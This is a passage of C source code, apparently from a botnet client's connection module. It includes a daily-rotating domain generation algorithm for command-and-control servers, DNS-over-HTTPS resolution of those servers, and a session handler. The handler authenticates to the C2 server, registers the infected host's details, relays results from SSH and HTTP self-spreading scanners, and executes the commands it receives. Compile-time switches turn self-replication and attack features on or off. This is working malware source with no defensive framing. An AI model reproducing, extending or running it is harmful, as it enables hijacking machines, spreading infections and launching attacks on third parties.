        debug_log("resolve_one: TXT empty, falling back to direct: %s", ds_cstr(&txt_domain));
        expand_ip_ports(&result, ds_cstr(&txt_domain),
                        ds_len(&cfg_port) > 0 ? ds_cstr(&cfg_port) : "443");
    } else if (!is_ip && strchr(decoded, ':') == NULL) {
        /* bare hostname without port — TXT failed, try A record via getaddrinfo */
        debug_log("resolve_one: bare hostname, falling back to direct: %s", decoded);
        expand_ip_ports(&result, decoded, "443");
    }

    ds_free(&txt_domain);
    ds_free(&cfg_port);
    return result;
}

/* ======================================================================
   dialga_one — decrypt config entry at index, resolve to addresses
   ====================================================================== */

strarr dialga_one(int idx)
{
    strarr result;
    dstr decoded;

    sa_init(&result);

    if (idx < 0 || idx >= (int)sa_count(&g_service_addrs)) return result;

    decoded = venusaur(sa_get(&g_service_addrs, idx));
    if (ds_len(&decoded) == 0) {
        ds_free(&decoded);
        return result;
    }

    debug_log("dialga_one[%d]: decoded = %s", idx, ds_cstr(&decoded));
    result = resolve_one(ds_cstr(&decoded));
    ds_free(&decoded);
    return result;
}

/* ======================================================================
   kyurem — DGA domain generation for a given index
   Generates domain + port from daily rotating seed.
   ====================================================================== */

void kyurem(int index, dstr *domain_out, dstr *port_out)
{
    time_t now;
    struct tm *t;
    sha256_ctx_t ctx;
    uint8_t hash[32];
    char seed_str[128];
    char domain_buf[64];
    int port_num;
    int i;

    ds_init(domain_out);
    ds_init(port_out);

    now = time(NULL);
    t   = gmtime(&now);

    /* seed = CONFIG_SEED + year + month + day + index */
    snprintf(seed_str, sizeof(seed_str), "%s%04d%02d%02d%d",
             CONFIG_SEED,
             t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
             index);

    /* hash the seed with sha256 streaming API */
    sha256_init(&ctx);
    sha256_update(&ctx, (const uint8_t *)seed_str, strlen(seed_str));
    sha256_finish(&ctx, hash);

    /* generate domain label from first 16 bytes of hash */
    for (i = 0; i < 16; i++) {
        domain_buf[i] = 'a' + (hash[i] % 26);
    }
    domain_buf[16] = '\0';

    ds_set(domain_out, domain_buf);
    ds_cat(domain_out, DGA_TLD);

    /* port from bytes 16-17 of hash, mapped to 1024-65535 */
    port_num = 1024 + (((int)hash[16] << 8) | hash[17]) % (65535 - 1024);

    {
        char pbuf[8];
        snprintf(pbuf, sizeof(pbuf), "%d", port_num);
        ds_set(port_out, pbuf);
    }

    debug_log("kyurem[%d]: %s:%s", index, ds_cstr(domain_out), ds_cstr(port_out));
}

/* ======================================================================
   necrozma — resolve hostname to IP via DoH (rayquaza) then system DNS
   ====================================================================== */

dstr necrozma(const char *domain)
{
    dstr ip;

    /* try DoH first */
    ip = rayquaza(domain);
    if (ds_len(&ip) > 0) return ip;

    /* fallback: system getaddrinfo */
    {
        struct addrinfo hints, *res;
        int ret;

        memset(&hints, 0, sizeof(hints));
        hints.ai_family   = AF_INET;
        hints.ai_socktype = SOCK_STREAM;

        ret = getaddrinfo(domain, NULL, &hints, &res);
        if (ret == 0 && res) {
            struct sockaddr_in *sin = (struct sockaddr_in *)res->ai_addr;
            char buf[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &sin->sin_addr, buf, sizeof(buf));
            ds_set(&ip, buf);
            freeaddrinfo(res);
        }
    }

    return ip;
}

/* ======================================================================
   anonymous_sudan — C2 session handler (auth + command loop)

   Protocol (over encrypted VPE2 channel):
     Server → "AUTH_CHALLENGE:<challenge>\n"
     Bot    → sha256_b64(challenge + SYNC_TOKEN + challenge) + "\n"
     Server → "AUTH_SUCCESS\n"  or  "AUTH_FAILED\n"
     Bot    → "REGISTER:<version>:<bot_id>:<arch>:<ram>:<cpu>:<proc>\n"
     Server → "PING\n"     Bot → "PONG\n"
     Server → "<command>\n" Bot → executes via black_energy
   ====================================================================== */

void anonymous_sudan(conn_t *c)
{
    dstr line;
    dstr challenge;
    dstr response;
    dstr reg_msg;
    char ram_str[32], cpu_str[16];

    if (!c || !c->valid) return;

    /* Initialize protocol strings (lazy decrypt) */
    ensure_proto();

    /* Step 1: Read AUTH_CHALLENGE */
    line = vpn_read_line(c, 15);
    if (ds_len(&line) == 0) {
        debug_log("anonymous_sudan: no challenge received");
        ds_free(&line);
        return;
    }

    /* expect "AUTH_CHALLENGE:<challenge>" */
    if (strncmp(ds_cstr(&line), "AUTH_CHALLENGE:", 15) != 0) {
        debug_log("anonymous_sudan: unexpected: %s", ds_cstr(&line));
        ds_free(&line);
        return;
    }

    ds_init(&challenge);
    ds_set(&challenge, ds_cstr(&line) + 15);
    ds_free(&line);

    /* Step 2: Compute response = hafnium(challenge, SYNC_TOKEN)
       = base64(sha256(challenge + SYNC_TOKEN + challenge)) */
    response = hafnium(ds_cstr(&challenge), SYNC_TOKEN);
    ds_free(&challenge);

    /* send response */
    vpn_writes(c, ds_cstr(&response));
    vpn_writes(c, "\n");
    ds_free(&response);

    if (!c->valid) return;

    /* Step 3: Read AUTH_SUCCESS or AUTH_FAILED */
    line = vpn_read_line(c, 15);
    if (ds_len(&line) == 0 || !ds_eq(&line, ds_cstr(&g_proto_success))) {
        debug_log("anonymous_sudan: auth failed: %s", ds_cstr(&line));
        ds_free(&line);
        return;
    }
    ds_free(&line);

    debug_log("anonymous_sudan: authenticated");

    /* Step 4: Send REGISTER message
       Format: REGISTER:<version>:<bot_id>:<arch>:<ram>:<cpu>:<proc>:<uplink> */
    ds_init(&reg_msg);

    snprintf(ram_str, sizeof(ram_str), "%lld", (long long)g_ram);
    snprintf(cpu_str, sizeof(cpu_str), "%d", g_cpu);

    /* Build: REGISTER:<version>:<bot_id>:<arch>:<ram>:<cpu>:<proc> */
    ds_cat(&reg_msg, "REGISTER:");
    ds_cat(&reg_msg, BUILD_TAG);
    ds_cat(&reg_msg, ":");
    ds_cat(&reg_msg, ds_cstr(&g_bot_id));
    ds_cat(&reg_msg, ":");
    ds_cat(&reg_msg, ds_cstr(&g_arch));
    ds_cat(&reg_msg, ":");
    ds_cat(&reg_msg, ram_str);
    ds_cat(&reg_msg, ":");
    ds_cat(&reg_msg, cpu_str);
    ds_cat(&reg_msg, ":");
    ds_cat(&reg_msg, ds_cstr(&g_proc));
    ds_cat(&reg_msg, ":");
    ds_cat(&reg_msg, ds_empty(&g_origin) ? "direct" : ds_cstr(&g_origin));
#ifndef NO_SELFREP
    ds_cat(&reg_msg, ":scan");
#else
    ds_cat(&reg_msg, ":noscan");
#endif
#ifndef NO_ATTACK
    ds_cat(&reg_msg, ":atk");
#else
    ds_cat(&reg_msg, ":noatk");
#endif
    ds_cat(&reg_msg, "\n");

    vpn_writes(c, ds_cstr(&reg_msg));
    ds_free(&reg_msg);

    if (!c->valid) return;

    debug_log("anonymous_sudan: registered, entering command loop");

    /* Step 5: Command loop — read first byte, dispatch binary or text */
    for (;;) {
        int first;

        /* Poll C2 fd + all scanner report pipes */
        {
            struct pollfd pfds[6];
            int nfds = 1, ret, c2_ready = 0;

            pfds[0].fd = c->fd;
            pfds[0].events = POLLIN;

#ifndef NO_SELFREP
            {
                int *scan_fds[] = { &ssh_report_fd, &http_report_fd };
                int si;
                for (si = 0; si < 2; si++) {
                    if (*scan_fds[si] >= 0) {
                        pfds[nfds].fd = *scan_fds[si];
                        pfds[nfds].events = POLLIN;
                        nfds++;
                    }
                }
            }
#endif

            ret = poll(pfds, nfds, 180 * 1000);

#ifndef NO_SELFREP
            /* Drain all active scanner pipes */
            {
                struct { int *fd; int *pid; } scanners[] = {
                    { &ssh_report_fd, &ssh_scanner_pid },
                    { &http_report_fd, &http_exploit_pid },
                };
                int si;
                for (si = 0; si < 2; si++) {
                    if (*scanners[si].fd >= 0) {
                        char rpbuf[512];
                        ssize_t rn;
                        while ((rn = read(*scanners[si].fd, rpbuf, sizeof(rpbuf) - 1)) > 0) {
                            rpbuf[rn] = '\0';
                            vpn_writes(c, rpbuf);
                        }
                        if (rn == 0) {
                            int dead_pid = *scanners[si].pid;
                            close(*scanners[si].fd);
                            *scanners[si].fd = -1;
                            *scanners[si].pid = 0;
                            if (dead_pid > 0) waitpid(dead_pid, NULL, WNOHANG);
                        }
                    }
                }
            }
#endif

            if (ret < 0 && errno == EINTR) continue;
            if (ret == 0) {
                debug_log("anonymous_sudan: no data in 180s, disconnecting");
                break;
            }

            c2_ready = (pfds[0].revents & POLLIN);
            if (!c2_ready) continue; /* only pipe had data, loop back */
        }

        first = vpn_read_byte(c, 0);

        if (!c->valid || first < 0) {
            break;
        }

        if ((uint8_t)first == CMD_MAGIC) {
            /* Binary command: [0xFF][cmd_id:1][len:2 BE][args:N] */
            uint8_t cmd_id;
            uint8_t len_buf[2];
            uint16_t args_len;
            char args[4096];

            if (vpn_read_exact(c, &cmd_id, 1, 10) < 0) break;
            if (vpn_read_exact(c, len_buf, 2, 10) < 0) break;
            args_len = ((uint16_t)len_buf[0] << 8) | len_buf[1];
            if (args_len > sizeof(args) - 1) {
                debug_log("anonymous_sudan: args too large (%d), dropping", args_len);
                break;
            }
            if (args_len > 0) {
                if (vpn_read_exact(c, args, args_len, 10) < 0) break;
                /* VPE2: no XOR layer — transport encryption handles all crypto */
            }
            args[args_len] = '\0';

            debug_log("anonymous_sudan: bin cmd=0x%02X len=%d args=%s", cmd_id, args_len, args);
            dispatch_cmd(c, cmd_id, args);
        } else {
            /* Text line — accumulate rest until \n (PING/PONG or legacy) */
            dstr line;
            ds_init(&line);
            ds_catc(&line, (char)first);

            for (;;) {
                int b = vpn_read_byte(c, 180);
                if (b < 0 || b == '\n') break;
                if (b != '\r') ds_catc(&line, (char)b);
            }

            if (!c->valid) { ds_free(&line); break; }

            if (ds_eq(&line, "PING")) {
                vpn_writes(c, "PONG\n");
                debug_log("anonymous_sudan: got PING, sent PONG");
            } else if (ds_len(&line) > 0) {
                /* Legacy text command fallback */
                debug_log("anonymous_sudan: text cmd = %s", ds_cstr(&line));
                black_energy(c, ds_cstr(&line));
            }
            ds_free(&line);
        }
    }

    debug_log("anonymous_sudan: session ended");
}

/* end of connection.c */
